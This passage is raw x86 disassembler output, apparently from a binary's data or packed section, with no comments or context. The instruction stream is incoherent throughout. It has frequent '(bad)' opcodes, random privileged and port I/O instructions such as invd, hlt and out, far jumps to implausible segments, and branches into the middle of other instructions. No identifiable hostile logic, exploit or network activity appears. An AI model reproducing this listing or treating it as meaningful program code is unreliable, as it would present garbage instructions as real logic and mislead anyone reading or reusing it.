  412198:	cmp    BYTE PTR [ecx],bl
  41219a:	out    dx,eax
  41219b:	add    al,0x9b
  41219d:	popf   
  41219e:	cmp    BYTE PTR [ebp-0x1e],ah
  4121a1:	(bad)  
  4121a2:	fld    QWORD PTR [edx+esi*8+0x3fa807f5]
  4121a9:	inc    edi
  4121aa:	push   esi
  4121ab:	xlat   BYTE PTR ds:[ebx]
  4121ac:	mov    al,ds:0x5065e2a5
  4121b1:	popf   
  4121b2:	mov    BYTE PTR [ebp+0x23],dh
  4121b5:	dec    ebx
  4121b6:	nop
  4121b7:	jno    0x4121b7
  4121b9:	aaa    
  4121ba:	mov    eax,0xea0d9562
  4121bf:	sub    al,0x98
  4121c1:	loop   0x412217
  4121c3:	(bad)  
  4121c4:	jmp    FWORD PTR [eax-0x192a20b7]
  4121ca:	into   
  4121cb:	dec    esi
  4121cc:	icebp  
  4121cd:	inc    ebx
  4121ce:	jnp    0x41215c
  4121d0:	xor    DWORD PTR [ecx],0x1f
  4121d3:	push   esp
  4121d4:	inc    edi
  4121d5:	aam    0x5b
  4121d7:	dec    edx
  4121d8:	adc    ebp,0xd1aefbb8
  4121de:	out    dx,al
  4121df:	test   BYTE PTR [ecx+0x71],bh
  4121e2:	cmp    ah,dl
  4121e4:	fst    DWORD PTR ds:[edi+esi*8]
  4121e8:	(bad)  
  4121ea:	cmp    DWORD PTR fs:[edx-0x18],0x54
  4121ef:	or     eax,0x7d9b8e21
  4121f4:	jbe    0x41224d
  4121f6:	in     eax,0x4
  4121f8:	aas    
  4121f9:	jns    0x4121ab
  4121fb:	es stos BYTE PTR es:[edi],al
  4121fd:	jns    0x412198
  4121ff:	pusha  
  412200:	fsubrp st(3),st
  412202:	cli    
  412203:	mov    ds:0x49481d30,eax
  412208:	(bad)  
  412209:	and    ebp,DWORD PTR [ebp+esi*1-0x730d992e]
  412210:	pop    edi
  412211:	or     DWORD PTR [edx-0x4e],ebx
  412214:	cmp    BYTE PTR [eax-0x26d3717d],al
  41221a:	test   eax,0xdabce185
  41221f:	idiv   esp
  412221:	das    
  412222:	pop    edx
  412223:	pop    ebx
  412224:	std    
  412225:	push   cs
  412226:	mov    ds:0xeb028724,al
  41222b:	inc    ebp
  41222c:	lods   al,BYTE PTR ds:[esi]
  41222d:	bound  ebx,QWORD PTR [eax-0x28]
  412230:	out    dx,al
  412231:	lahf   
  412232:	xchg   edx,eax
  412233:	lea    esp,[ebx]
  412235:	sub    eax,0x64e056e
  41223a:	dec    BYTE PTR [edi]
  41223c:	sbb    DWORD PTR [ecx],edx
  41223e:	pop    edi
  41223f:	pop    edx
  412240:	pop    ebx
  412241:	es push ds
  412243:	out    dx,eax
  412244:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412245:	out    0x28,eax
  412247:	push   ss
  412248:	ins    BYTE PTR es:[edi],dx
  412249:	cmc    
  41224a:	stos   DWORD PTR es:[edi],eax
  41224b:	shl    BYTE PTR [ecx-0x18],cl
  41224e:	(bad)  
  412250:	cmp    esp,DWORD PTR [ebx+0x6509f85b]
  412256:	inc    eax
  412257:	pop    ebp
  412258:	xchg   esi,eax
  412259:	pop    ecx
  41225a:	cdq    
  41225b:	test   edx,esp
  41225d:	inc    esi
  41225e:	mov    dl,0x68
  412260:	ds addr16 xor ecx,eax
  412264:	mov    edi,0x7779aa77
  412269:	add    BYTE PTR [eax-0x62],bh
  41226c:	lock mov ds:0xde3284c5,al
  412272:	ja     0x4121f5
  412274:	fisttp DWORD PTR ds:0x6598ebbd
  41227b:	or     al,bl
  41227d:	out    0xb4,al
  41227f:	enter  0xfe76,0xc8
  412283:	sbb    eax,0x3078a3e1
  412288:	dec    ebp
  412289:	xchg   edi,eax
  41228a:	jne    0x41227e
  41228c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41228d:	jb     0x4122ea
  41228f:	enter  0xe8e6,0x18
  412293:	adc    al,0xdd
  412295:	lahf   
  412296:	enterw 0x42d7,0xd0
  41229b:	inc    esp
  41229c:	and    DWORD PTR [ecx+0x29a0baaa],ebx
  4122a2:	fld    DWORD PTR [ebx]
  4122a4:	inc    ebp
  4122a6:	mov    ds:0x681f317b,al
  4122ab:	cmp    bl,BYTE PTR [esi-0x3d]
  4122ae:	fild   WORD PTR [ebp-0x1ebfccc4]
  4122b4:	cmp    DWORD PTR [ecx-0x2dd953ef],esi
  4122ba:	jb     0x41225c
  4122bc:	pop    edi
  4122bd:	out    dx,eax
  4122be:	(bad)  
  4122bf:	mov    esp,DWORD PTR [ebx-0x19]
  4122c2:	loop   0x4122db
  4122c4:	fmul   st(0),st
  4122c6:	rcl    BYTE PTR [esi+0x528399ff],cl
  4122cc:	inc    edx
  4122cd:	sbb    BYTE PTR [edx+0x40],0x40
  4122d1:	(bad)  
  4122d2:	iret   
  4122d3:	push   ecx
  4122d4:	ficom  WORD PTR [ebx+esi*4-0x56cce47c]
  4122db:	dec    edi
  4122dc:	sbb    esi,DWORD PTR [ecx]
  4122de:	rcl    edx,1
  4122e0:	adc    DWORD PTR ds:[eax+eiz*8-0x55bc1558],edx
  4122e8:	mov    WORD PTR [ebx],es
  4122ea:	push   ds
  4122eb:	xchg   DWORD PTR [ebp-0x5b],esp
  4122ee:	stos   BYTE PTR es:[edi],al
  4122ef:	cmp    eax,0x2d0c4b85
  4122f4:	add    al,0xb6
  4122f6:	pop    ebx
  4122f7:	in     al,dx
  4122f8:	mov    eax,0x78227e34
  4122fd:	jbe    0x412351
  4122ff:	test   eax,ebx
  412301:	push   ds
  412302:	mov    ds:0xdfb9c20c,eax
  412307:	jecxz  0x412365
  412309:	nop
  41230a:	pop    ebx
  41230b:	mov    ah,0x6f
  41230d:	jae    0x4122d6
  41230f:	cmc    
  412310:	or     BYTE PTR [edx+eiz*8],0xa9
  412314:	add    BYTE PTR [ebx-0x40],dl
  412317:	test   DWORD PTR [edx],esp
  412319:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41231a:	xchg   edx,eax
  41231b:	jne    0x4122d8
  41231d:	or     ebx,DWORD PTR [edx-0xa]
  412320:	addr16 in eax,0xc5
  412323:	sar    al,0xf5
  412326:	imul   eax,DWORD PTR [ebx+ecx*8+0x3f25d61e],0x52bac91d
  412331:	cmp    BYTE PTR [edi],bl
  412333:	nop
  412334:	es (bad) 
  412336:	pop    ss
  412337:	sbb    ch,ah
  412339:	pop    es
  41233a:	pop    ds
  41233b:	xchg   DWORD PTR [eax],ebp
  41233d:	jge    0x412364
  41233f:	inc    edx
  412340:	sub    al,0xae
  412342:	and    BYTE PTR [ebp+0x7f],0x78
  412346:	pop    esp
  412347:	ss icebp 
  412349:	xchg   DWORD PTR [ebx+0x75],ebp
  41234c:	cld    
  41234d:	jbe    0x412395
  41234f:	push   edx
  412350:	aad    0xf9
  412352:	and    al,BYTE PTR [esi]
  412354:	jno    0x412334
  412356:	sar    BYTE PTR ds:0x9f9acc12,1
  41235c:	aas    
  41235d:	(bad)  
  41235e:	rcl    bl,cl
  412360:	rcr    BYTE PTR [edx],1
  412362:	aad    0xb8
  412364:	mov    ebp,0x9d5e58e6
  412369:	dec    ecx
  41236a:	or     eax,0x94bf176e
  41236f:	not    DWORD PTR [ebx+0x12]
  412372:	pop    ebx
  412373:	mov    dh,al
  412375:	and    DWORD PTR [eax+0x9],ecx
  412378:	(bad)  
  412379:	pop    edi
  41237a:	xlat   BYTE PTR ds:[ebx]
  41237b:	test   ebp,ecx
  41237d:	js     0x412350
  41237f:	daa    
  412380:	aas    
  412381:	mov    ds:0xed63bdea,eax
  412386:	sbb    BYTE PTR [eax-0x2005188b],dh
  41238c:	dec    ebx
  41238d:	mov    esi,0x3322cf81
  412392:	(bad)  
  412393:	mov    edx,0x585ac1ff
  412398:	push   ebx
  412399:	add    BYTE PTR [edx+0xf6d4299],bh
  41239f:	mov    edx,0x7daf3104
  4123a4:	or     DWORD PTR [ebx-0x5974fbb4],0x2f633a6e
  4123ae:	pop    ebp
  4123af:	inc    eax
  4123b0:	jmp    0x412379
  4123b2:	push   edi
  4123b3:	jmp    0x4c10:0xa80f27ee
  4123ba:	jns    0x412341
  4123bc:	lea    ebx,[edi-0x66c0c58d]
  4123c2:	fadd   st,st(5)
  4123c4:	push   esi
  4123c5:	jecxz  0x4123ba
  4123c7:	fnstcw WORD PTR [ebp+0x8]
  4123ca:	retf   0xea1
  4123cd:	mov    DWORD PTR ss:[edi+esi*1+0xfe35024],eax
  4123d5:	or     al,BYTE PTR [edi+ebp*2+0x20]
  4123d9:	and    DWORD PTR [edx-0x56],ebx
  4123dc:	mov    ds:0xa411c6d5,eax
  4123e1:	loopne 0x41243e
  4123e3:	test   DWORD PTR [edi-0x227f2ec1],esi
  4123e9:	lea    ecx,[ebx+edx*8-0x17ab0d89]
  4123f0:	ds cmp al,0xda
  4123f3:	or     DWORD PTR [edx-0x19],ebx
  4123f6:	lock gs pop ds
  4123f9:	std    
  4123fa:	push   esi
  4123fb:	xor    BYTE PTR [ebx+0x59],bh
  4123fe:	test   BYTE PTR [eax-0x33],al
  412401:	(bad)  
  412402:	pop    ecx
  412403:	ins    BYTE PTR es:[edi],dx
  412404:	mov    ecx,0x1db7427f
  412409:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41240a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41240b:	inc    ebp
  41240c:	dec    edx
  41240d:	invd   
  41240f:	mov    ebx,0x84694793
  412414:	and    BYTE PTR [ebp+0x4b3e663f],cl
  41241a:	mov    ecx,DWORD PTR [edi]
  41241c:	xor    al,0xa8
  41241e:	lods   al,BYTE PTR ds:[esi]
  41241f:	in     al,0xd1
  412421:	out    0x7c,al
  412423:	jge    0x412461
  412425:	cmp    al,0xbb
  412427:	hlt    
  412428:	and    cl,BYTE PTR [ebp+0x2b]
  41242b:	inc    ebp
  41242c:	inc    esp
  41242d:	data16 and BYTE PTR gs:[edx],al
  412431:	push   ebx
  412432:	ficomp DWORD PTR [ecx+ecx*4-0x3f3ced1a]
  412439:	scas   eax,DWORD PTR es:[edi]
  41243a:	fs fcmove st,st(7)
  41243d:	inc    edi
  41243e:	xrelease mov BYTE PTR [edx-0x1eabdf06],dl
  412445:	fst    DWORD PTR fs:[ebp+0x7ed52098]
  41244c:	or     ecx,edi
  41244e:	mov    edx,0x6ff4d063
  412453:	outs   dx,DWORD PTR ds:[esi]
  412454:	loop   0x41243f
  412456:	fidivr DWORD PTR [ebx+0x3f]
  412459:	jns    0x412404
  41245b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41245c:	lods   eax,DWORD PTR ds:[esi]
  41245d:	ja     0x412498
  41245f:	std    
  412460:	xchg   esp,eax
  412461:	mov    eax,0xbf8e3a12
  412466:	stc    
  412467:	std    
  412468:	rol    DWORD PTR [edi-0x47f077a6],cl
  41246e:	pushf  
  41246f:	lods   eax,DWORD PTR ds:[esi]
  412470:	call   0x63ab:0xa9bc903b
  412477:	add    ebp,DWORD PTR [edi]
  412479:	adc    al,0xad
  41247b:	loope  0x4124bb
  41247d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41247e:	adc    al,0x91
  412480:	dec    ebx
  412481:	(bad)  
  412482:	cli    
  412483:	inc    esi
  412484:	pop    edx
  412485:	jmp    0x8b642d14
  41248a:	aad    0xb2
  41248c:	ret    
  41248d:	loop   0x41250e
  41248f:	(bad)  [ebp+0x5eeac40d]
  412495:	std    
  412496:	(bad)  [eax+0x45]
  412499:	stos   BYTE PTR es:[edi],al
  41249a:	fisubr DWORD PTR [ebp+0x1c]
  41249d:	and    ch,BYTE PTR [edi-0x46]
  4124a0:	xchg   esi,eax
  4124a1:	shl    DWORD PTR [esi-0x6899fd72],1
  4124a7:	dec    ecx
  4124a8:	fbld   TBYTE PTR [ebx]
  4124aa:	or     eax,0x5ab9599a
  4124af:	or     al,0x7a
  4124b1:	pop    edx
  4124b2:	pop    esi
  4124b3:	push   esp
  4124b4:	cmp    al,0xa7
  4124b6:	xor    eax,DWORD PTR [edi+edi*8-0x271f6801]
  4124bd:	ins    DWORD PTR es:[edi],dx
  4124be:	aad    0x9f
  4124c0:	push   ebx
  4124c1:	(bad)  
  4124c2:	pop    edx
  4124c3:	loop   0x4124d8
  4124c5:	ss std 
  4124c7:	repnz mov dh,0xa5
  4124ca:	ret    0xd1fc
  4124cd:	call   0x6749fc2a
  4124d2:	lds    eax,FWORD PTR [edx+0x3e]
  4124d5:	out    dx,eax
  4124d6:	and    BYTE PTR [ebp+0x3da46656],dh
  4124dc:	and    dh,0xe0
  4124df:	into   
  4124e0:	pusha  
  4124e1:	jp     0x412519
  4124e3:	jl     0x4124f4
  4124e5:	xor    al,BYTE PTR [ecx]
  4124e7:	js     0x4124ea
  4124e9:	push   esi
  4124ea:	pop    edx
  4124eb:	sbb    al,bh
  4124ed:	repnz in eax,0x12
  4124f0:	fstp   QWORD PTR cs:0xba0d5784
  4124f7:	inc    esi
  4124f8:	aas    
  4124f9:	lahf   
  4124fa:	shr    BYTE PTR [edx],0x69
  4124fd:	lods   eax,DWORD PTR ds:[esi]
  4124fe:	daa    
  4124ff:	aaa    
  412500:	lods   eax,DWORD PTR ds:[esi]
  412501:	cmc    
  412502:	shl    BYTE PTR [edx],cl
  412504:	ins    DWORD PTR es:[edi],dx
  412505:	mov    bl,0x76
  412507:	ror    DWORD PTR [ecx+0x3e375b25],1
  41250d:	push   edi
  41250e:	mov    esi,0x51e459fc
  412513:	out    dx,al
  412514:	ret    0x630a
  412517:	jo     0x412597
  412519:	leave  
  41251a:	nop
  41251b:	mov    eax,DWORD PTR [ecx]
  41251d:	and    DWORD PTR [ecx],ebp
  41251f:	and    al,0x9c
  412521:	mov    ch,BYTE PTR [ebp-0x7099e352]
  412527:	add    eax,0x2d41e13e
  41252c:	dec    edx
  41252d:	lods   al,BYTE PTR ds:[esi]
  41252e:	sub    ebp,ecx
  412530:	mov    al,0x36
  412532:	sub    eax,0x98fe68d8
  412537:	test   al,al
  412539:	ret    0x39e1
  41253c:	lahf   
  41253d:	stos   DWORD PTR es:[edi],eax
  41253e:	loopne 0x412540
  412540:	aas    
  412541:	dec    edi
  412542:	jg     0x412563
  412544:	out    0xf1,al
  412546:	in     eax,0xfe
  412548:	inc    eax
  412549:	out    0xa6,al
  41254b:	fwait
  41254c:	movups XMMWORD PTR [esi+esi*4-0x4c],xmm5
  412551:	lods   eax,DWORD PTR ds:[esi]
  412552:	fwait
  412553:	mov    dh,0xd6
  412555:	lods   eax,DWORD PTR es:[esi]
  412557:	pop    eax
  412558:	rol    ah,0x5b
  41255b:	dec    esp
  41255c:	repnz pop edi
  41255e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41255f:	(bad)  
  412560:	cwde   
  412561:	out    0x17,al
  412563:	xchg   BYTE PTR [ebx-0x6b2fa10a],dl
  412569:	push   esi
  41256a:	in     eax,dx
  41256b:	add    DWORD PTR fs:[edi+0x5b],eax
  41256f:	ss sub ebp,esp
  412572:	mov    WORD PTR [esi+edi*4],ss
  412575:	add    eax,0x67ac8d8e
  41257a:	shl    ebx,1
  41257c:	(bad)  
  41257d:	push   ecx
  41257e:	call   0x5b0db2cc
  412583:	mov    al,0xdc
  412585:	ret    0x8ff5
  412588:	sub    BYTE PTR [ebx-0x30415459],0x93
  41258f:	xchg   BYTE PTR [edi],dh
  412591:	xchg   al,al
  412593:	imul   eax,DWORD PTR [edx-0x73],0x1b
  412597:	aad    0x56
  412599:	xor    eax,ecx
  41259b:	test   bh,bl
  41259d:	test   al,0x44
  41259f:	push   edi
  4125a0:	out    0x8a,al
  4125a2:	push   edx
  4125a3:	test   BYTE PTR [esi+0x3fb89137],dh
  4125a9:	pop    ss
  4125aa:	enter  0x2f3d,0x4a
  4125ae:	mov    eax,ds:0x28e7f0c6
  4125b3:	fistp  WORD PTR [edx+0x71]
  4125b6:	add    al,0x67
  4125b8:	(bad)  
  4125b9:	sub    al,0xa9
  4125bb:	push   esp
  4125bc:	add    bl,bh
  4125be:	mov    esp,0xbb523022
  4125c3:	xor    dh,al
  4125c5:	stos   DWORD PTR es:[edi],eax
  4125c6:	sub    DWORD PTR [eax],ecx
  4125c8:	dec    ecx
  4125c9:	cmp    edx,0x67
  4125cc:	inc    esi
  4125cd:	mov    al,ds:0xeb0b854a
  4125d2:	and    DWORD PTR [ecx+0x3f],esp
  4125d5:	and    ebp,0x4e
  4125d8:	pusha  
  4125d9:	or     edi,DWORD PTR [eax]
  4125db:	jb     0x41265a
  4125dd:	out    0x34,al
  4125df:	idiv   DWORD PTR [ecx-0x30]
  4125e2:	xchg   ecx,eax
  4125e3:	mov    eax,0x3725c483
  4125e8:	inc    eax
  4125e9:	jmp    0x9b375e49
  4125ee:	imul   edi,DWORD PTR [edx-0x789fddb0],0xc2b5612
  4125f8:	jo     0x412665
  4125fa:	mov    dh,0x65
  4125fc:	cli    
  4125fd:	cli    
  4125fe:	push   ebp
  4125ff:	ds aas 
  412601:	inc    esi
  412602:	push   ss
  412603:	out    0x7f,al
  412605:	cli    
  412606:	inc    esi
  412607:	add    BYTE PTR [eax+edx*1-0x6f],bh
  41260b:	dec    eax
  41260c:	mov    esp,0xc99cd937
  412611:	add    ecx,eax
  412613:	sbb    BYTE PTR gs:[ecx-0x7a684fd8],0xa3
  41261b:	mov    esp,0xcfff7d3e
  412620:	sbb    BYTE PTR [eax+0x7f140ce4],dl
  412626:	xor    BYTE PTR [edx+0x635507a4],cl
  41262c:	xchg   esi,eax
  41262d:	bnd jns 0x412667
  412630:	jno    0x41266b
  412632:	pop    ebx
  412633:	jl     0x41261e
  412635:	enter  0x12b0,0x68
  412639:	aas    
  41263a:	repz xor BYTE PTR [esi],cl
  41263d:	mov    cl,0xcd
  41263f:	test   DWORD PTR [edi],ebx
  412641:	push   0xadfed8bf
  412646:	loop   0x4125cd
  412648:	mov    cs,WORD PTR [edi+0x733f1fef]
  41264e:	cld    
  41264f:	test   al,0x14
  412651:	mov    WORD PTR [edx+0x40dd007f],cs
  412657:	fld    DWORD PTR [eax-0x2133981a]
  41265d:	out    dx,eax
  41265e:	adc    eax,0xd94b07f0
  412663:	jb     0x412624
  412665:	mov    BYTE PTR [esp+ebp*8],bl
  412668:	sbb    esp,DWORD PTR [edi+0x4aceaea]
  41266e:	in     eax,0x84
  412670:	hlt    
  412671:	shl    BYTE PTR [edx],0xe0
  412674:	ds xchg ecx,eax
  412676:	retf   
  412677:	inc    eax
  412678:	cmp    al,0xef
  41267a:	jne    0x412606
  41267c:	cmp    eax,esi
  41267e:	mov    al,ds:0xa188843c
  412683:	inc    edi
  412684:	xchg   DWORD PTR fs:[edx-0x5f],ebx
  412688:	ret    
  412689:	das    
  41268a:	mov    esi,ebx
  41268c:	mov    ah,0xe9
  41268e:	pop    ebx
  41268f:	sub    al,0x83
  412691:	ss aam 0xfd
  412694:	inc    esi
  412695:	inc    ebx
  412696:	in     eax,0x84
  412698:	and    eax,eax
  41269a:	data16 into 
  41269c:	cmp    BYTE PTR [ecx+0x3634b737],ch
  4126a2:	cmp    eax,0xdf10db90
  4126a7:	ja     0x4126f8
  4126a9:	out    0xfa,eax
  4126ab:	xchg   ebp,eax
  4126ac:	call   0xb910c177
  4126b1:	pusha  
  4126b2:	push   ss
  4126b3:	xlat   BYTE PTR ds:[ebx]
  4126b4:	stc    
  4126b5:	pop    ebp
  4126b6:	push   eax
  4126b7:	mov    ds:0x10ec4cbe,al
  4126bc:	push   0x1f
  4126be:	and    ecx,DWORD PTR [ebp-0x6c]
  4126c1:	jns    0x4126ae
  4126c3:	xchg   BYTE PTR [ebx+ebp*1],bh
  4126c6:	sub    DWORD PTR [edx+0xe],ecx
  4126c9:	loopne 0x4126a2
  4126cb:	gs sbb eax,0x743259e5
  4126d1:	rcr    BYTE PTR [eax],cl
  4126d3:	test   al,0x3a
  4126d5:	in     eax,0x82
  4126d7:	jg     0x41267a
  4126d9:	mov    ebx,0x7c35ea07
  4126de:	imul   ecx,DWORD PTR [ebx],0x2cc2ddeb
  4126e4:	fnstcw WORD PTR [ebp+0x4c82fe5a]
  4126ea:	rol    BYTE PTR [edi-0x7ac1b90c],cl
  4126f0:	aad    0x22
  4126f2:	xrelease xchg BYTE PTR [eax],ch
  4126f5:	ret    
  4126f6:	add    eax,0x57e6dee1
  4126fb:	leave  
  4126fc:	push   ebx
  4126fd:	scas   eax,DWORD PTR es:[edi]
  4126fe:	and    bl,BYTE PTR [eax-0x7bae9528]
  412704:	jo     0x4126c0
  412706:	xrelease mov DWORD PTR [edi],edi
  412709:	xchg   ecx,eax
  41270a:	jne    0x41277d
  41270c:	sub    eax,0x722bb4
  412711:	lock (bad) 
  412713:	dec    BYTE PTR [edi]
  412715:	pop    esp
  412716:	fadd   DWORD PTR [ebp-0x7b4af011]
  41271c:	jns    0x412717
  41271e:	sub    BYTE PTR ds:0x6049fc52,al
  412724:	out    dx,al
  412725:	sub    al,0x5a
  412727:	mov    dl,0x3e
  412729:	mov    ebp,0xbed8ad38
  41272e:	nop
  41272f:	and    edi,edi
  412731:	out    0xb0,al
  412733:	das    
  412734:	pop    ecx
  412735:	add    BYTE PTR [edx-0x16dab8f7],al
  41273b:	in     eax,0x7d
  41273d:	xchg   ebx,eax
  41273e:	pop    ebx
  41273f:	mov    al,0x92
  412741:	cmp    BYTE PTR [esi+0x43bc68e1],bl
  412747:	repnz pushf 
  412749:	leave  
  41274a:	adc    dl,BYTE PTR [edi]
  41274c:	(bad)  
  41274d:	div    DWORD PTR [esp+eax*4]
  412750:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412751:	mov    BYTE PTR [edi],ch
  412753:	nop    DWORD PTR [edx+ebx*2+0x329d1f58]
  41275b:	pop    edi
  41275c:	sahf   
  41275d:	jb     0x41276d
  41275f:	test   BYTE PTR [ebp+0x1fc25938],dh
  412765:	cli    
  412766:	mov    DWORD PTR [edi+0x36],eax
  412769:	push   ebp
  41276a:	pop    edx
  41276b:	and    BYTE PTR [esi],bl
  41276d:	pop    ds
  41276e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41276f:	ds cmp al,0x71
  412772:	lock test BYTE PTR [ecx+0x6f],cl
  412776:	jecxz  0x41278b
  412778:	ds mov bl,0x1e
  41277b:	gs cmc 
  41277d:	or     esi,DWORD PTR [ecx]
  41277f:	jle    0x41277b
  412781:	loope  0x412735
  412783:	lods   al,BYTE PTR ds:[esi]
  412784:	add    eax,0x4fa07d5b
  412789:	in     al,dx
  41278a:	mov    ah,0xc
  41278c:	aas    
  41278d:	sub    eax,esp
  41278f:	dec    edi
  412790:	cld    
  412791:	add    al,0x3b
  412793:	pop    ecx
  412794:	sub    ah,dh
  412796:	xor    al,0x6e
  412798:	int3   
  412799:	dec    DWORD PTR [ecx+0x74]
  41279c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41279d:	and    eax,0xb27ae67c
  4127a2:	pop    ebx
  4127a3:	into   
  4127a4:	call   0x2d5291a
  4127a9:	xor    eax,0xcc94f97a
  4127ae:	pop    edx
  4127af:	loopne 0x412826
  4127b1:	test   ebp,edx
  4127b3:	mov    dh,0x51
  4127b5:	dec    ebx
  4127b6:	pop    edx
  4127b7:	int3   
  4127b8:	push   cs
  4127b9:	jmp    0x41278a
  4127bb:	int    0x23
  4127bd:	out    0x9a,al
  4127bf:	pop    ecx
  4127c0:	mov    esi,0xc436b0e4
  4127c5:	adc    dl,BYTE PTR [eax+ebx*1]
  4127c8:	sbb    DWORD PTR [ebx+0x5a],ebx
  4127cb:	xor    ch,ch
  4127cd:	imul   ebp,esi,0xffffffeb
  4127d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127d2:	pop    ecx
  4127d3:	test   DWORD PTR [ebx+0x73],edx
  4127d6:	fbstp  TBYTE PTR [ecx-0x1]
  4127d9:	inc    edi
  4127da:	sahf   
  4127db:	push   edi
  4127dc:	cwde   
  4127dd:	sub    BYTE PTR [ebx],0xdc
  4127e0:	sub    esi,esp
  4127e2:	inc    edx
  4127e3:	push   0x6142fd14
  4127e8:	inc    ebp
  4127e9:	test   BYTE PTR [esi+0x4744d984],ah
  4127ef:	mov    edx,0x6355c33f
  4127f4:	mov    ebx,0xc4932cbf
  4127f9:	dec    ebx
  4127fa:	cmp    bl,bh
  4127fc:	push   ss
  4127fd:	dec    edx
  4127fe:	lods   eax,DWORD PTR ds:[esi]
  4127ff:	xchg   DWORD PTR [eax+0x25],ebx
  412802:	mov    bl,0x25
  412804:	and    DWORD PTR [edx],ecx
  412806:	hlt    
  412807:	inc    esp
  412808:	ds mov bl,0xac
  41280b:	cmp    bh,BYTE PTR ds:0x12325256
  412811:	out    0x24,eax
  412813:	jge    0x4127cf
  412815:	add    ebx,DWORD PTR [edx]
  412817:	cld    
  412818:	fucomp st(3)
  41281a:	mov    edx,0x22e5569d
  41281f:	jmp    0x18bf:0xe09ad6ab
  412826:	fs dec esi
  412828:	mov    BYTE PTR [ebx],0xf3
  41282b:	mov    edi,DWORD PTR [ebp+0x302f4707]
  412831:	jbe    0x41285a
  412833:	in     al,0x67
  412835:	jle    0x412892
  412837:	clc    
  412838:	out    dx,eax
  412839:	xor    al,0x7e
  41283b:	jmp    0x412845
  41283d:	xchg   ecx,eax
  41283e:	push   0xe208066a
  412843:	push   0x8578d6b2
  412848:	inc    edx
  412849:	(bad)  
  41284a:	stos   DWORD PTR es:[edi],eax
  41284b:	pop    ebp
  41284c:	adc    DWORD PTR es:[ebp+0x40],0x24bb195f
  412854:	test   bh,ah
  412856:	repnz test BYTE PTR [eax+0x61],0xf
  41285b:	sub    BYTE PTR [edx-0xf311bfb],0xa8
  412862:	ror    BYTE PTR [bx+0x69],0x5a
  412867:	es ds out 0x12,al
  41286b:	jae    0x4128aa
  41286d:	pop    edx
  41286e:	lods   al,BYTE PTR ds:[esi]
  41286f:	dec    edi
  412870:	jl     0x412878
  412872:	xchg   DWORD PTR [ebp-0x1c],esi
  412875:	or     BYTE PTR [ebp+0x64],dl
  412878:	fild   WORD PTR [esi+0x66]
  41287b:	cs xchg al,ch
  41287e:	dec    esi
  41287f:	adc    al,0x73
  412881:	(bad)  
  412882:	mov    es:0xe5701396,al
  412888:	rcl    DWORD PTR [edx+0x6f],cl
  41288b:	test   eax,0x9859adb3
  412890:	mov    DWORD PTR [ecx-0x3],edx
  412893:	aad    0x47
  412895:	test   BYTE PTR cs:[edi+esi*2-0x75],al
  41289a:	arpl   WORD PTR [edx-0x14],si
  41289d:	repz pop edx
  41289f:	inc    esp
  4128a0:	test   al,0xe6
  4128a2:	add    BYTE PTR [edx-0x48],0xc9
  4128a6:	fs pop ds
  4128a8:	ret    0xfbc4
  4128ab:	jb     0x412834
  4128ad:	mov    ebx,DWORD PTR [edx-0x5c]
  4128b0:	aad    0x99
  4128b2:	nop
  4128b3:	dec    ecx
  4128b4:	xchg   esi,eax
  4128b5:	out    0x68,eax
  4128b7:	jns    0x412870
  4128b9:	and    ebx,0xffffffff
  4128bc:	aam    0xe
  4128be:	mov    eax,0x5b216f09
  4128c3:	lods   al,BYTE PTR ds:[esi]
  4128c4:	push   ecx
  4128c5:	(bad)  
  4128c6:	data16 aam 0xf9
  4128c9:	fwait
  4128ca:	inc    esi
  4128cb:	jl     0x412906
  4128cd:	fimul  WORD PTR [edi-0x5f]
  4128d0:	sub    al,0x67
  4128d2:	add    cl,BYTE PTR [ecx+0x7f]
  4128d5:	arpl   WORD PTR [edi+eiz*1],ax
  4128d8:	rcl    DWORD PTR [ebx-0x38],1
  4128db:	add    eax,0xb05b6ef4
  4128e0:	sti    
  4128e1:	push   ss
  4128e2:	xlat   BYTE PTR ds:[ebx]
  4128e3:	stos   DWORD PTR es:[edi],eax
  4128e4:	pop    eax
  4128e5:	outs   dx,DWORD PTR ds:[esi]
  4128e6:	dec    esp
  4128e7:	repnz enter 0x5ac7,0x97
  4128ec:	out    0x19,eax
  4128ee:	fcom   QWORD PTR [ebp-0x41c475e7]
  4128f4:	xor    cl,ch
  4128f6:	cmp    al,0x6b
  4128f8:	push   esi
  4128f9:	in     eax,dx
  4128fa:	sub    edi,DWORD PTR [ebp+0x64d45316]
  412900:	leave  
  412901:	jmp    0x4128d4
  412903:	xor    bh,BYTE PTR [ebx-0x27f9a4b2]
  412909:	mov    eax,ds:0xab4625f9
  41290e:	xchg   DWORD PTR [ebp+eiz*8+0x1ba40c9c],eax
  412915:	leave  
  412916:	or     al,0xb5
  412918:	ds mov ch,0x6c
  41291b:	scas   al,BYTE PTR es:[edi]
  41291c:	xchg   esp,eax
  41291d:	cwde   
  41291e:	hlt    
  41291f:	gs pop esi
  412921:	pop    esp
  412922:	mov    ebp,0x5abdaf1c
  412927:	push   esp
  412928:	pop    ds
  412929:	mov    esi,0x598a323d
  41292e:	pop    ebx
  41292f:	shl    BYTE PTR [ecx+0x541b688d],cl
  412935:	jle    0x412995
  412937:	test   DWORD PTR [edx+0x3e50d12d],esi
  41293d:	mov    edi,0xf5edfb63
  412942:	aad    0x8c
  412944:	fsubr  st(7),st
  412946:	mov    esi,0x3a39b98b
  41294b:	xchg   esp,eax
  41294c:	shl    cl,1
  41294e:	xlat   BYTE PTR ds:[ebx]
  41294f:	retf   
  412950:	push   esp
  412951:	(bad)  
  412952:	inc    ebp
  412953:	loopne 0x4128f5
  412955:	hlt    
  412956:	push   ss
  412957:	inc    edi
  412958:	jle    0x4128ff
  41295a:	mov    DWORD PTR [edx],ecx
  41295c:	fdivr  DWORD PTR [esi]
  41295e:	(bad)  
  41295f:	adc    al,dl
